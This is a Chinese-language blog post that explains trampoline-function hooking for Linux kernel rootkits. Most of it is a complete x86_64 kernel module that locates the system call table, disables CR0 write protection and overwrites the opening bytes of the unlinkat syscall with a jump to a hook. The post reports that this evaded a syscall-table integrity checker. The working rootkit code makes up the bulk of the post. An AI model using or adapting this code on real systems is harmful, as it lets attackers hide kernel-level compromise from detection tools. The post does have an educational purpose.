### **前言**

之前在freebuf上看到Linux Rootkit的系列扫盲贴，也学着大神的样子写了几个内核的钩子拿来玩耍。后来买了一本讲Linux二进制的书，书里面最后一章专门科普的Rootkit技术。其中有一节介绍的蹦床（trampoline）函数，虽然不是什么新概念但是比之前自己“山寨”的钩子隐蔽性强了不少。自己研究了一下，补全了书中例程缺少的部分并移植到了x86\_64上。

### **前情提要**

之前接触的Rootkit技术多是通过劫持系统调用、内联vfs函数或者是通过内核自带的Kprobe调试钩子来实现的。其中，劫持系统调用这种方法比较容易，但是存在易被发现的缺点。以下图为例我们劫持1号系统调用，其实只不过是把systemcalltable\[1\]中保存的地址修改为我们自己定义的函数的地址，从而达到劫持的目的。然而正常情况下系统调用表是自始至终不会发生变化的，当检测到表中的内存地址发生改变时就很有可能存在Rootkit。

![](../Images/036a6861cbcfb6137fdac96b2877d332.png)

### **蹦床函数**

为了解决直接修改系统调用表易被发现的缺点，诞生出了蹦床函数。我们通过将一段汇编指令覆写到系统调用函数的前几个字节来达到劫持的目的的，并没有修改系统调用函数的地址。那段汇编代码通常是一个跳转指令，跳转到我们指定的蹦床函数的地址，从而让蹦床函数获取控制权。由此可知，通过检测系统调用表的变化是无法发现蹦床函数的。

**Demo OS： CentOS release 6.5 (Final) Kernel： 2.6.32-696.3.1.el6.x86\_64 劫持unlinkat系统调用（rm命令会用到unlinkat系统调用）**

```
2.  `#include <linux/kernel.h>`
    
3.  `#include <linux/init.h>`

8.  `MODULE_LICENSE("GPL");`
    
9.  `#define SYSCALL_NR __NR_unlinkat`
    
10.  
     
11.  `static void *memmem(const void *haystack, size_t haystack_len, const void *needle, size_t needle_len); `
     
12.  `asmlinkage int (*old_unlinkat)(int dfd, const char *pathname, int flag);`
     
13.  
     
14.  `unsigned char syscall_code[7];`
     
15.  `unsigned long *sys_call_table = NULL; `
     
16.  `/*    汇编指令push $address; ret   中间的四个\x00用于存放蹦床函数的地址  */`
     
17.  `unsigned char new_syscall_code[7] = "\x68\x00\x00\x00\x00\xc3";`
     
18.  
     
19.  `static void *memmem(const void *haystack, size_t haystack_len, const void *needle, size_t needle_len)   `
     
20.  `{  `
     
21.  `        const char *begin;   `
     
22.  `        const char *const last_possible = (const char *) haystack + haystack_len - needle_len;  `
     
23.  `        if (needle_len == 0){   `
     
24.  `                return (void *) haystack;  `
     
25.  `        }  `
     
26.  `        if (__builtin_expect(haystack_len < needle_len, 0)){   `
     
27.  `            return NULL;  `
     
28.  `        }  `
     
29.  `        for (begin = (const char *) haystack; begin <= last_possible; ++begin)   `
     
30.  `        {   `
     
31.  `                if (begin[0] == ((const char *) needle)[0] && !memcmp((const void *) &begin[1], (const void *) ((const char *) needle + 1), needle_len - 1)){  `
     
32.  `                        return (void *) begin;   `
     
33.  `                }  `
     
34.  `        }  `
     
35.  `        return NULL;   `
     
36.  `}  `
     
37.  
     
38.  `static unsigned long get_syscall_table_long(void)   `
     
39.  `{   `
     
40.  `        #define OFFSET_SYSCALL 200   `
     
41.  `        unsigned long syscall_long, retval;   `
     
42.  `        char sc_asm[OFFSET_SYSCALL];   `
     
43.  `        rdmsrl(MSR_LSTAR, syscall_long);   `
     
44.  `        memcpy(sc_asm, (char *)syscall_long, OFFSET_SYSCALL);   `
     
45.  `        retval = (unsigned long) memmem(sc_asm, OFFSET_SYSCALL, "\xff\x14\xc5", 3);`
     
46.  `        if ( retval != 0 ) {  `
     
47.  `                retval = (unsigned long) ( * (unsigned long *)(retval + 3) );   `
     
48.  `        } else {   `
     
49.  `                printk("long mode : memmem found nothing, returning NULL:(");   `
     
50.  `                retval = 0;   `
     
51.  `        }  `
     
52.  `        return retval;   `
     
53.  `} `
     
54.  
     
55.  `unsigned int clear_and_return_cr0(void)   `
     
56.  `{   `
     
57.  `        unsigned long cr0 = 0;   `
     
58.  `        unsigned long ret;  `
     
59.  `        asm volatile ("movq %%cr0, %%rax"   `
     
60.  `                : "=a"(cr0)   `
     
61.  `                );   `
     
62.  `        ret = cr0;  `
     
63.  `        cr0 &= 0xfffffffffffeffff;  `
     
64.  `        asm volatile ("movq %%rax, %%cr0"   `
     
65.  `                  :   `
     
66.  `                  : "a"(cr0)   `
     
67.  `                  );   `
     
68.  `        return ret;   `
     
69.  `}  `
     
70.  
     
71.  `void setback_cr0(unsigned long val)   `
     
72.  `{   `
     
73.  `        asm volatile ("movq %%rax, %%cr0"   `
     
74.  `                  :   `
     
75.  `                  : "a"(val)   `
     
76.  `                  );   `
     
77.  `}`
     
78.  
     
79.  `/*    蹦床函数    */`
     
80.  `int new_syscall(int dfd, const char *pathname, int flag) {`
     
81.  `        /*  do something    */`
     
82.  `        printk(KERN_INFO"I am the evil system_call!\n");`
     
83.  `        unsigned long orig_cr0 = clear_and_return_cr0();`
     
84.  `        /*  将被我们覆写的部分恢复原状   */`
     
85.  `        memcpy(sys_call_table[SYSCALL_NR],syscall_code,sizeof(syscall_code));`
     
86.  `        /*  重新发一次unlinkat系统调用   */`
     
87.  `        old_unlinkat(dfd,pathname,flag);`
     
88.  `        /*  将我们的汇编代码再次覆盖    */`
     
89.  `        memcpy(sys_call_table[SYSCALL_NR],new_syscall_code,sizeof(syscall_code));`
     
90.  `        setback_cr0(orig_cr0);`
     
91.  `        return 0;`
     
92.  `}  `
     
93.  
     
94.  `static int init_sys_call_table(void)   `
     
95.  `{ `
     
96.  `        /*  禁用寄存器cr0的写保护位   */`
     
97.  `        unsigned long orig_cr0 = clear_and_return_cr0();`
     
98.  `        /*  获取系统调用表 */`
     
99.  `        sys_call_table = (unsigned long *) get_syscall_table_long();  `
     
100.  `        sys_call_table = (unsigned long)sys_call_table | 0xffffffff00000000;   `
      
101.  `        if (sys_call_table == 0){   `
      
102.  `                printk("sys_call_table == 0/n");  `
      
103.  `                return -1;  `
      
104.  `        }`
      
105.  `        /*  保存最初的unlinkat系统调用函数地址   */`
      
106.  `        old_unlinkat = (asmlinkage int(*)(int dfd, const char *pathname, int flag))sys_call_table[SYSCALL_NR];`
      
107.  `        /*  将蹦床函数的地址写入汇编指令  */`
      
108.  `        *(int *)&new_syscall_code[1] = (int)new_syscall;`
      
109.  `        /*  保存unlinkat系统调用函数的前几个字节  */`
      
110.  `        memcpy(syscall_code,sys_call_table[SYSCALL_NR],sizeof(syscall_code));`
      
111.  `        /*  将我们汇编代码覆盖到unlinkat系统调用函数的前几个字节  */ `
      
112.  `        memcpy(sys_call_table[SYSCALL_NR],new_syscall_code,sizeof(syscall_code));`
      
113.  `        /*  恢复寄存器cr0的写保护位   */`
      
114.  `        setback_cr0(orig_cr0); `
      
115.  `        return 0;   `
      
116.  `}  `
      
117.  
      
118.  `static void clean_sys_call_table(void)  `
      
119.  `{  `
      
120.  `        unsigned long orig_cr0 = clear_and_return_cr0();`
      
121.  `        memcpy(sys_call_table[SYSCALL_NR],syscall_code,sizeof(syscall_code));`
      
122.  `        setback_cr0(orig_cr0);  `
      
123.  `        return ;  `
      
124.  `}  `
      
125.  
      
126.  `static int __init init_mod(void)  `
      
127.  `{`
      
128.  `        init_sys_call_table();`
      
129.  `        return 0;  `
      
130.  `}  `
      
131.  
      
132.  `static void __exit exit_mod(void)  `
      
133.  `{  `
      
134.  `        clean_sys_call_table();  `
      
135.  `}  `
      
136.  
      
137.  `module_init(init_mod);  `
      
138.  `module_exit(exit_mod)`
      
```

### **测试效果**

首先加载检测系统调用表的lkm，它会保存当时的系统调用表并每分钟与现行的列表进行对比。当我们将劫持unlinkat系统调用的模块加载成功之后，检测模块发现263号系统调用的入口地址发生变化，卸载该模块后发现系统调用表恢复正常。最后载入Demo模块使用rm命令删除任意文件，发现系统调用已经被劫持，但并未被检测模块发现。

### **后记**

这种rootkit的方式非常隐蔽，需要通过调试内核检查系统调用函数的前几个字节是否存在跳转来发现。但是现在大部分Linux发行版解压出来的内核镜像中缺少符号表，也就是说很难在不重新编译内核的前提下调试内核。
